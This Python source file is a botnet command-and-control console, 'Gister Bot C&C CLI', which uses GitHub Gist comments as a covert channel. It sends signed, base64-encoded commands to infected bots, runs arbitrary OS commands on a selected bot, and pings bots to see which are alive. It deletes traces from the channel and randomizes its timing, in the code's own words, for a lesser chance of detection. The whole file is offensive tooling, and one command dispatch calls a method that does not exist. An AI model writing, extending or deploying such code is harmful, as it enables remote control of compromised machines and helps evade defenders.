import base64
import threading
import random
from time import sleep, time
from github.GistComment import GistComment
from typing import List

from channel import Channel
from nacl.signing import SigningKey


class Controller:
    def __init__(self, token: str, gist: str, signing_seed: str):
        """
        Initializes the Controller object.
        :param token: GitHub personal access token
        :param gist: Gist ID
        :param signing_seed: The seed to use for generation of singing private key
        """
        self.channel = Channel(token, gist)
        self.active = True
        self.response_thread = threading.Thread(
            target=self.receive_responses, daemon=True
        )
        self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
        self.last_ping = None

        self.signing_key = SigningKey(base64.b64decode(signing_seed.encode("utf-8")))
        print(f"Verify key: {base64.b64encode(self.signing_key.verify_key.encode())}")

        self.bots = {}
        self.bots_lock = threading.Lock()

        self.selected_bot = None

        self.response_thread.start()
        self.ping_thread.start()
        self.wait_for_commands()

    def receive_responses(self):
        """
        Checks the channel for new responses from bots
        """
        while self.active:
            for new_response in self.channel.check_messages():
                self.handle_response(new_response)

            # Randomized sleep for a lesser chance of detection
            sleep(random.uniform(1.5, 5))

    def handle_response(self, response: GistComment):
        """
        Handles responses from bots
        :param response: the response to decode and process
        """
        with self.bots_lock:
            if Channel.PING_RESPONSE in response.body:
                bot_id, command_id = self.parse_response_metadata(response)

                if not self.bots.get(bot_id):
                    self.bots[bot_id] = {}

                self.bots[bot_id]["last_ping"] = command_id

                self.channel.delete_message(response.id)

            elif Channel.BINARY_RESPONSE in response.body:
                bot_id, command_id = self.parse_response_metadata(response)

                bot = self.bots.get(bot_id)

                if bot and bot["commands"] and bot["commands"][command_id]:

                    output_begin = response.body.find("(") + 1
                    output_end = response.body.find(")", output_begin)

                    output = base64.b64decode(
                        response.body[
                            output_begin : output_end
                        ].encode("utf-8")
                    ).decode("utf-8")

                    print(f"\n{output}")
                    self.channel.delete_message(command_id)
                    bot["commands"].pop(command_id)

                self.channel.delete_message(response.id)

    def parse_response_metadata(self, response: GistComment) -> (str, str):
        """
        Parses needed response metadata from a response
        :param response: GistComment containing the response
        :return:
        """
        response_footer = response.body[response.body.rfind("[") :]
        response_id = base64.b64decode(
            response_footer.split("(")[1].split(")")[0].encode("utf-8")
        ).decode("utf-8")

        bot_id = response_id.split("-")[1]
        command_id = int(response_id.split("-")[0])

        return bot_id, command_id

    def ping_bots(self):
        """
        Pings all bots to check which bots are still alive.
        """
        while self.active:

            if self.last_ping:
                self.channel.delete_message(self.last_ping)

            with self.bots_lock:
                active_bots = {}

                for bot_id, bot in self.bots.items():
                    if bot["last_ping"] == self.last_ping:
                        active_bots[bot_id] = bot
                    elif bot["commands"]:
                        self.cancel_running_commands(bot["commands"])

                self.bots = active_bots

                if self.selected_bot not in self.bots:
                    self.selected_bot = None

                self.last_ping = self.send_command(f"{Channel.PING_REQUEST}").id

            # Randomized sleep for a lesser chance of detection
            sleep(random.uniform(50, 70))

    def cancel_running_commands(self, commands: dict):
        """
        Cancels running commands and clears them from the channel if the bot goes offline
        :param commands:
        :return:
        """
        for running_cmd, _ in commands.items():
            try:
                self.channel.delete_message(running_cmd)
            except:
                continue

    def wait_for_commands(self):
        """
        Waits for user input and executes commands based on it
        """
        while self.active:
            input_str = input(f"({self.selected_bot if self.selected_bot else '*'})$ ")
            args = input_str.split(" ")

            command = args[0].lower()

            if command == "exit":
                self.exit()
            elif command == "status":
                self.print_status()
            elif command == "help":
                self.print_help()
            elif command == "list":
                self.print_bots()
            elif command == "bot":
                self.select_bot(args[1:])
            elif command == "exec":
                self.execute_binary(args[1:])
            else:
                print("Invalid command. For a list of available commands enter 'help'.")

    def exit(self):
        """
        Stops the controller console
        """
        self.active = False

        if self.last_ping:
            self.channel.delete_message(self.last_ping)

    def print_status(self):
        """
        Prints bot status (how many are still alive based on pings)
        """
        with self.bots_lock:
            print(f"Bots currently online: {len(self.bots)}")

    def print_bots(self):
        """
        Prints all alive bots
        """
        with self.bots_lock:
            for bot_id in self.bots.keys():
                print(f"{bot_id}")

    def select_bot(self, args: List[str]):
        """
        Selects the bot to which following commands are sent
        :param args: Command arguments
        """
        if len(args) < 1:
            print("You must enter a valid bot ID.")
            return

        with self.bots_lock:
            bot_id = args[0]

            if bot_id == "*":
                self.selected_bot = None
            elif bot_id in self.bots.keys():
                self.selected_bot = bot_id
            else:
                print("The given bot is invalid or the given bot is offline")

    def execute_command(self, args: List[str]):
        """
        Executes an arbitrary command on the target OS
        :param args: The command
        """
        with self.bots_lock:
            if not self.selected_bot:
                print(
                    "No bot selected, sending arbitrary commands to all bots at once is not supported!"
                )
                return

            bot_id = base64.b64encode(self.selected_bot.encode("utf-8")).decode("utf-8")

            self.send_command(
                f"{Channel.BINARY_REQUEST} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",
                save_command=True,
            )

    def send_command(self, command: str, save_command: bool = False) -> GistComment:
        """
        Signs the command and sends it to the channel
        :param command: Command to send
        :param save_command: Whether to save this command to the bot dict
        :return: GistComment containing the command
        """
        signature = base64.b64encode(
            self.signing_key.sign(command.encode("utf-8")).signature
        ).decode("utf-8")

        command += f" [](_{signature}_)"

        command = self.channel.send_message(command)

        if save_command:
            bot = self.bots[self.selected_bot]

            if not bot.get("commands"):
                bot["commands"] = {}

            bot["commands"][command.id] = time()

        return command

    def print_help(self):
        """
        Prints help.
        """
        print(
            f"\n"
            f"Gister Bot C&C CLI\n"
            f"==================\n"
            f"List of available commands:\n"
            f"status\t\t\t=> Prints the number of available bots\n"
            f"list\t\t\t=> Lists available (alive) bots\n"
            f"bot <bot id>\t=> Selects a bot to execute commands on\n"
            f"exec <command>\t=> Executes a command on a selected bot\n"
            f"exit\t\t\t=> Cleans up the communication channel and exits\n"
        )
